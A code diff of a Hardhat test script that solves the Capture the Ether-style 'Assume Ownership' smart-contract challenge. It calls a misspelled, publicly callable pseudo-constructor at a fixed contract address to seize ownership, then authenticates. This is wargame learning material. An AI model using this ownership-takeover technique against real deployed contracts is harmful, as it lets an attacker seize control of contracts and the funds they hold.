@@ -1,35 +1,27 @@
-import crypto, { sign } from "crypto";
-import { ethers } from "hardhat";
-import { BigNumber, Contract, Signer } from "ethers";
-import { expect } from "chai";
-import { formatEtherscanTx } from "../utils/format";
-import { HDNode } from "ethers/lib/utils";
+import {ethers} from "hardhat";
+import {Contract, Signer} from "ethers";
+import {expect} from "chai";
+
 
 let accounts: Signer[];
-let eoa: Signer;
-let attacker: Contract;
+let attacker: Signer;
 let contract: Contract; // challenge contract
-let tx: any;
 
-before(async () => {
-  accounts = await ethers.getSigners();
-  [eoa] = accounts;
-  const challengeFactory = await ethers.getContractFactory(
-    "AssumeOwnershipChallenge"
-  );
-  contract = challengeFactory.attach(
-    `0x5845030FAA1E04D794FE219a1A956b05b86Fcc3d`
-  );
+before(async function () {
+    accounts = await ethers.getSigners();
+    attacker = accounts[0];
+    const factory = await ethers.getContractFactory("AssumeOwnershipChallenge", attacker);
+    contract = factory.attach(`0x62Da9f0AD4974f0b6dEf35b7b859E07942AA326f`);
 });
 
 it("solves the challenge", async function () {
-  // the supposed-to-be constructor is misspelled (owMer) and can be called
+    await  contract.AssumeOwmershipChallenge({gasLimit:1e6});
+    let tx = await contract.authenticate({gasLimit:1e6});
+    await ethers.provider.waitForTransaction(tx.hash);
+    console.log("transation hash:",tx.hash);
 
-  tx = await contract.AssumeOwmershipChallenge()
-  await tx.wait()
-  tx = await contract.authenticate();
-  await tx.wait();
+});
 
-  const isComplete = await contract.isComplete();
-  expect(isComplete).to.be.true;
+after(async function () {
+    expect(await contract.isComplete()).to.eq(true);
 });
